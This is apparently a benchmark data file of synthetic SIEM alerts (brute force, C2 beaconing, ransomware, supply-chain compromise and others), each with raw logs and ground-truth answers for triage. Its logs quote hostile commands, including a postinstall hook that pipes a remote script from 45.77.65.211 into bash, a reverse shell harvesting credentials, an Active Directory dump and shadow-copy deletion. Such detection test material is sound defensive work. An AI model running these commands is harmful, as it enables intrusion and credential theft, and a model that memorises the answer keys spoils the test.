@@ -1,0 +1,200 @@
+[
+  {
+    "task_type": "brute_force",
+    "severity": "high",
+    "siem_event": {
+      "title": "SSH brute force from single source IP",
+      "source_ip": "10.20.5.14",
+      "destination_ip": "203.0.113.77",
+      "hostname": "SRV-BASTION-01",
+      "username": "root",
+      "rule_name": "SSH_BruteForce_Threshold",
+      "raw_log": "Mar 21 02:14:33 SRV-BASTION-01 sshd[28714]: Failed password for root from 203.0.113.77 port 44821 ssh2\nMar 21 02:14:34 SRV-BASTION-01 sshd[28715]: Failed password for root from 203.0.113.77 port 44822 ssh2\nMar 21 02:14:35 SRV-BASTION-01 sshd[28716]: Failed password for admin from 203.0.113.77 port 44823 ssh2\nMar 21 02:14:36 SRV-BASTION-01 sshd[28717]: Failed password for ubuntu from 203.0.113.77 port 44824 ssh2\nMar 21 02:14:38 SRV-BASTION-01 sshd[28718]: Accepted password for admin from 203.0.113.77 port 44825 ssh2\nMar 21 02:14:38 SRV-BASTION-01 sshd[28718]: pam_unix(sshd:session): session opened for user admin(uid=1001) by (uid=0)\n847 failed attempts in 120 seconds from 203.0.113.77. Account admin compromised on attempt 848."
+    },
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_iocs": ["203.0.113.77", "SRV-BASTION-01", "admin"],
+      "expected_risk_range": [75, 100]
+    }
+  },
+  {
+    "task_type": "c2_communication_hunt",
+    "severity": "critical",
+    "siem_event": {
+      "title": "Cobalt Strike HTTPS beaconing detected",
+      "source_ip": "10.12.5.34",
+      "destination_ip": "185.220.101.42",
+      "hostname": "WS-FIN-019",
+      "username": "CORP\\m.anderson",
+      "rule_name": "C2_Beacon_Interval_Detection",
+      "raw_log": "2026-03-21T01:30:00Z WS-FIN-019 rundll32.exe -> 185.220.101.42:443 POST /api/v2/status HTTP/1.1 Host: cdn-update.systemcheck.xyz Content-Length: 256 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\n2026-03-21T01:31:00Z WS-FIN-019 rundll32.exe -> 185.220.101.42:443 POST /api/v2/status HTTP/1.1 Host: cdn-update.systemcheck.xyz Content-Length: 256\n2026-03-21T01:32:01Z WS-FIN-019 rundll32.exe -> 185.220.101.42:443 POST /api/v2/status HTTP/1.1 Host: cdn-update.systemcheck.xyz Content-Length: 512\nBeacon interval: 60s +/- 15% jitter. Domain cdn-update.systemcheck.xyz registered 2 days ago via Njalla. TLS cert CN=cdn-update.systemcheck.xyz issued by Let's Encrypt."
+    },
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_iocs": ["185.220.101.42", "cdn-update.systemcheck.xyz", "rundll32.exe", "WS-FIN-019"],
+      "expected_risk_range": [85, 100]
+    }
+  },
+  {
+    "task_type": "cloud_infrastructure",
+    "severity": "critical",
+    "siem_event": {
+      "title": "AWS IAM key exfiltration and unauthorized S3 access",
+      "source_ip": "10.0.4.22",
+      "destination_ip": "198.51.100.91",
+      "hostname": "EC2-PROD-API-03",
+      "username": "svc-deploy-prod",
+      "rule_name": "AWS_IAM_Key_Abuse",
+      "raw_log": "2026-03-21T03:12:44Z CloudTrail: GetCallerIdentity from IP 198.51.100.91 (Tor exit node) with AccessKeyId AKIA3EXAMPLE7DEPLOY\n2026-03-21T03:12:47Z CloudTrail: ListBuckets by svc-deploy-prod from 198.51.100.91 — 47 buckets enumerated\n2026-03-21T03:12:52Z CloudTrail: GetObject s3://prod-customer-data/exports/2026-Q1-full.csv.gz by svc-deploy-prod from 198.51.100.91\n2026-03-21T03:12:55Z CloudTrail: GetObject s3://prod-customer-data/exports/pii-records-2026.parquet by svc-deploy-prod from 198.51.100.91\n2026-03-21T03:13:01Z CloudTrail: CreateAccessKey for user svc-deploy-prod by svc-deploy-prod from 198.51.100.91 — new key AKIA3EXAMPLENEWKEY01\nNormal source for svc-deploy-prod: 10.0.4.0/24 (VPC). 198.51.100.91 is a known Tor exit node (AbuseIPDB confidence 97%)."
+    },
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_iocs": ["198.51.100.91", "AKIA3EXAMPLE7DEPLOY", "AKIA3EXAMPLENEWKEY01", "svc-deploy-prod"],
+      "expected_risk_range": [90, 100]
+    }
+  },
+  {
+    "task_type": "data_exfiltration",
+    "severity": "critical",
+    "siem_event": {
+      "title": "Large outbound data transfer to external storage service",
+      "source_ip": "10.10.3.88",
+      "destination_ip": "104.16.51.111",
+      "hostname": "WS-RND-042",
+      "username": "CORP\\d.nguyen",
+      "rule_name": "DLP_Large_Upload_External",
+      "raw_log": "2026-03-21T04:45:12Z WS-RND-042 chrome.exe -> 104.16.51.111:443 POST https://mega.nz/upload Content-Length: 524288000\n2026-03-21T04:45:12Z DLP-PROXY: File upload detected: project-athena-source-v3.7z (500MB) to mega.nz by CORP\\d.nguyen\n2026-03-21T04:30:00Z WS-RND-042 7z.exe: Compressing C:\\Projects\\Athena\\src\\* -> C:\\Users\\d.nguyen\\Desktop\\project-athena-source-v3.7z (password-protected)\n2026-03-21T04:28:55Z WS-RND-042 net.exe: net use \\\\FILE-RND-01\\projects /user:CORP\\d.nguyen\n2026-03-21T04:29:00Z WS-RND-042 robocopy.exe: \\\\FILE-RND-01\\projects\\Athena -> C:\\Projects\\Athena\\ /E /COPY:DAT — 12,847 files, 2.3GB copied\nUser d.nguyen submitted 2-week resignation notice on 2026-03-19. Athena is classified as trade-secret IP."
+    },
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_iocs": ["104.16.51.111", "mega.nz", "project-athena-source-v3.7z", "d.nguyen"],
+      "expected_risk_range": [90, 100]
+    }
+  },
+  {
+    "task_type": "insider_threat",
+    "severity": "high",
+    "siem_event": {
+      "title": "After-hours database dump by departing employee",
+      "source_ip": "10.10.8.15",
+      "destination_ip": "10.10.2.50",
+      "hostname": "WS-HR-003",
+      "username": "CORP\\k.patel",
+      "rule_name": "Insider_OffHours_DB_Access",
+      "raw_log": "2026-03-21T02:17:33Z WS-HR-003 sqlcmd.exe -S SQL-HR-01 -d HRDatabase -Q \"SELECT * FROM employees WHERE salary > 100000\" -o C:\\Temp\\emp_salary.csv\n2026-03-21T02:18:01Z WS-HR-003 sqlcmd.exe -S SQL-HR-01 -d HRDatabase -Q \"SELECT ssn, full_name, bank_account FROM employees\" -o C:\\Temp\\emp_pii.csv\n2026-03-21T02:19:45Z WS-HR-003 powershell.exe: Compress-Archive -Path C:\\Temp\\emp_*.csv -DestinationPath C:\\Temp\\hr_export.zip\n2026-03-21T02:20:12Z WS-HR-003 outlook.exe: New email to k.patel.personal@protonmail.com with attachment hr_export.zip (14.2MB)\nUser k.patel: HR Analyst, performance improvement plan initiated 2026-03-10, normal working hours 09:00-17:30 IST. Access at 02:17 local time is anomalous. SQL-HR-01 contains PII for 3,400 employees."
+    },
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_iocs": ["SQL-HR-01", "k.patel.personal@protonmail.com", "hr_export.zip", "WS-HR-003"],
+      "expected_risk_range": [80, 100]
+    }
+  },
+  {
+    "task_type": "lateral_movement",
+    "severity": "high",
+    "siem_event": {
+      "title": "PsExec lateral spread from compromised workstation",
+      "source_ip": "10.10.1.44",
+      "destination_ip": "10.10.1.50",
+      "hostname": "WS-DEV-017",
+      "username": "CORP\\svc-deploy",
+      "rule_name": "LateralMove_PsExec_MultiHost",
+      "raw_log": "2026-03-21T05:22:10Z WS-DEV-017 PsExec.exe \\\\SRV-APP-01 -u CORP\\svc-deploy -p *** cmd.exe /c whoami && ipconfig /all\n2026-03-21T05:22:14Z SRV-APP-01 PSEXESVC.exe spawned cmd.exe (PID 4412) as CORP\\svc-deploy\n2026-03-21T05:22:18Z WS-DEV-017 PsExec.exe \\\\SRV-APP-02 -u CORP\\svc-deploy -p *** cmd.exe /c net user /domain\n2026-03-21T05:22:25Z WS-DEV-017 PsExec.exe \\\\SRV-DB-01 -u CORP\\svc-deploy -p *** cmd.exe /c dir \\\\SRV-DB-01\\c$\\backup\\\n2026-03-21T05:22:30Z WS-DEV-017 PsExec.exe \\\\DC-01 -u CORP\\svc-deploy -p *** cmd.exe /c ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\\ntds_dump\" q q\n2026-03-21T05:22:35Z DC-01 Event 4672: Special privileges assigned to CORP\\svc-deploy\n5 hosts contacted in 25 seconds via PsExec. svc-deploy is a service account — no interactive login expected. ntdsutil on DC-01 indicates Active Directory database extraction attempt."
+    },
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_iocs": ["WS-DEV-017", "DC-01", "CORP\\svc-deploy", "PsExec.exe"],
+      "expected_risk_range": [85, 100]
+    }
+  },
+  {
+    "task_type": "network_beaconing",
+    "severity": "medium",
+    "siem_event": {
+      "title": "DNS TXT query beaconing with encoded subdomains",
+      "source_ip": "10.12.8.107",
+      "destination_ip": "198.51.100.23",
+      "hostname": "WS-DEV-042",
+      "username": "CORP\\j.chen",
+      "rule_name": "DNS_Beaconing_TXT_Anomaly",
+      "raw_log": "2026-03-21T06:00:01Z WS-DEV-042 svchost.exe DNS TXT query: aGVsbG8gd29ybGQ.ns1.dnsresolv.net -> 198.51.100.23\n2026-03-21T06:00:31Z WS-DEV-042 svchost.exe DNS TXT query: dG9rZW46YWJjMTIz.ns1.dnsresolv.net -> 198.51.100.23\n2026-03-21T06:01:01Z WS-DEV-042 svchost.exe DNS TXT query: Y3JlZHM6YWRtaW4.ns1.dnsresolv.net -> 198.51.100.23\n2026-03-21T06:01:31Z WS-DEV-042 svchost.exe DNS TXT query: c2Vzc2lvbjoxMjM0.ns1.dnsresolv.net -> 198.51.100.23\nParent process: powershell.exe (PID 7712). Query rate: 45/min. Subdomain labels are base64-encoded. Domain dnsresolv.net registered 5 days ago via NameCheap. Normal DNS TXT query rate for this host: <2/hour."
+    },
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_iocs": ["198.51.100.23", "dnsresolv.net", "WS-DEV-042"],
+      "expected_risk_range": [65, 90]
+    }
+  },
+  {
+    "task_type": "phishing",
+    "severity": "medium",
+    "siem_event": {
+      "title": "Credential harvesting phishing email with spoofed sender",
+      "source_ip": "10.0.0.42",
+      "destination_ip": "203.0.113.50",
+      "hostname": "WS-ANALYST-07",
+      "username": "jsmith",
+      "rule_name": "Email_Phishing_URL_Click",
+      "raw_log": "2026-03-21T09:14:22Z SMTP-GW: From: IT Support <itsupport@micros0ft-365.com> To: jsmith@corp.local Subject: [URGENT] Password Expires in 2 Hours — Verify Now\nHeaders: Return-Path: bounce@micros0ft-365.com, X-Originating-IP: 91.234.56.78, SPF: fail, DKIM: none, DMARC: fail\nBody URL: https://micros0ft-365.com/secure-login.php?user=jsmith&token=abc123def\n2026-03-21T09:15:44Z WS-ANALYST-07 Proxy: GET https://micros0ft-365.com/secure-login.php?user=jsmith&token=abc123def HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) — 200 OK text/html 34KB\n2026-03-21T09:16:02Z WS-ANALYST-07 Proxy: POST https://micros0ft-365.com/secure-login.php HTTP/1.1 Content-Type: application/x-www-form-urlencoded — user=jsmith&password=REDACTED\nDomain micros0ft-365.com registered 6 hours ago. SSL cert issued by Let's Encrypt. Page title: 'Microsoft 365 — Sign In'. User jsmith submitted credentials."
+    },
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_iocs": ["203.0.113.50", "micros0ft-365.com", "91.234.56.78"],
+      "expected_risk_range": [70, 95]
+    }
+  },
+  {
+    "task_type": "privilege_escalation",
+    "severity": "high",
+    "siem_event": {
+      "title": "Local privilege escalation via PrintNightmare exploit",
+      "source_ip": "10.10.6.33",
+      "destination_ip": "10.10.6.33",
+      "hostname": "WS-ACCT-009",
+      "username": "CORP\\r.kim",
+      "rule_name": "PrivEsc_PrintNightmare_CVE2021",
+      "raw_log": "2026-03-21T07:45:11Z WS-ACCT-009 Event 7045: Service installed — Name: SpoolSvc, Path: C:\\Windows\\System32\\spool\\drivers\\x64\\3\\evil.dll, Account: LocalSystem\n2026-03-21T07:45:11Z WS-ACCT-009 spoolsv.exe loaded C:\\Windows\\System32\\spool\\drivers\\x64\\3\\evil.dll (unsigned, sha256: a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2)\n2026-03-21T07:45:12Z WS-ACCT-009 evil.dll spawned cmd.exe (PID 8844) running as NT AUTHORITY\\SYSTEM\n2026-03-21T07:45:13Z WS-ACCT-009 cmd.exe (PID 8844): net localgroup Administrators CORP\\r.kim /add\n2026-03-21T07:45:14Z WS-ACCT-009 Event 4732: Member added to Administrators group: CORP\\r.kim by NT AUTHORITY\\SYSTEM\nUser r.kim: standard Accounting user, no admin rights expected. Print spooler exploit CVE-2021-34527 signature match. evil.dll not in allowlist."
+    },
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_iocs": ["evil.dll", "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2", "WS-ACCT-009", "CORP\\r.kim"],
+      "expected_risk_range": [80, 100]
+    }
+  },
+  {
+    "task_type": "ransomware",
+    "severity": "critical",
+    "siem_event": {
+      "title": "Ransomware encryption activity on file server",
+      "source_ip": "10.10.2.70",
+      "destination_ip": "10.10.2.70",
+      "hostname": "FS-SHARED-01",
+      "username": "CORP\\t.wilson",
+      "rule_name": "Ransomware_MassFileRename",
+      "raw_log": "2026-03-21T08:33:01Z FS-SHARED-01 svchost_update.exe (PID 6128, unsigned, sha256: f4e3d2c1b0a9f4e3d2c1b0a9f4e3d2c1b0a9f4e3d2c1b0a9f4e3d2c1b0a9f4e3): CreateFile \\\\FS-SHARED-01\\Finance\\Q1_Report.xlsx.encrypted\n2026-03-21T08:33:01Z FS-SHARED-01 svchost_update.exe: CreateFile \\\\FS-SHARED-01\\Finance\\Budget_2026.xlsx.encrypted\n2026-03-21T08:33:02Z FS-SHARED-01 svchost_update.exe: CreateFile \\\\FS-SHARED-01\\Finance\\DECRYPT_README.txt\n2026-03-21T08:33:02Z FS-SHARED-01 DECRYPT_README.txt contents: \"Your files have been encrypted by BLACKCAT. Send 4.5 BTC to bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh. Contact: decrypt0r@onionmail.org\"\n2026-03-21T08:33:04Z FS-SHARED-01 vssadmin.exe: Delete Shadows /All /Quiet\n2026-03-21T08:33:05Z FS-SHARED-01 wmic.exe: shadowcopy delete\n1,247 files renamed to .encrypted in 180 seconds. Volume shadow copies deleted. Network share \\\\FS-SHARED-01\\Finance\\ (340GB, 23 users) fully encrypted."
+    },
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_iocs": ["svchost_update.exe", "f4e3d2c1b0a9f4e3d2c1b0a9f4e3d2c1b0a9f4e3d2c1b0a9f4e3d2c1b0a9f4e3", "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", "decrypt0r@onionmail.org"],
+      "expected_risk_range": [95, 100]
+    }
+  },
+  {
+    "task_type": "supply_chain_compromise",
+    "severity": "critical",
+    "siem_event": {
+      "title": "Backdoored npm package deployed to production",
+      "source_ip": "10.10.4.12",
+      "destination_ip": "45.77.65.211",
+      "hostname": "SRV-CI-RUNNER-03",
+      "username": "svc-jenkins",
+      "rule_name": "SupplyChain_Suspicious_Package",
+      "raw_log": "2026-03-21T10:05:33Z SRV-CI-RUNNER-03 npm install: added lodash-utils@2.1.4 (published 3 hours ago by npm user xz_maintainer)\n2026-03-21T10:05:34Z SRV-CI-RUNNER-03 lodash-utils@2.1.4 postinstall script: node -e \"require('child_process').exec('curl -s http://45.77.65.211:8443/init.sh|bash')\"\n2026-03-21T10:05:35Z SRV-CI-RUNNER-03 bash: curl -s http://45.77.65.211:8443/init.sh | bash\n2026-03-21T10:05:36Z SRV-CI-RUNNER-03 init.sh: Downloading /tmp/.cache_worker from 45.77.65.211:8443\n2026-03-21T10:05:37Z SRV-CI-RUNNER-03 /tmp/.cache_worker: Connecting to 45.77.65.211:4444 (reverse shell)\n2026-03-21T10:05:38Z SRV-CI-RUNNER-03 /tmp/.cache_worker: Enumerating environment variables — AWS_ACCESS_KEY_ID, GITHUB_TOKEN, NPM_TOKEN found\nPackage lodash-utils is typosquat of lodash. Version 2.1.4 added postinstall hook absent in 2.1.3. Publisher xz_maintainer account created 24 hours ago. CI runner has access to production deployment credentials."
+    },
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_iocs": ["45.77.65.211", "lodash-utils@2.1.4", "/tmp/.cache_worker", "xz_maintainer"],
+      "expected_risk_range": [90, 100]
+    }
+  }
+]
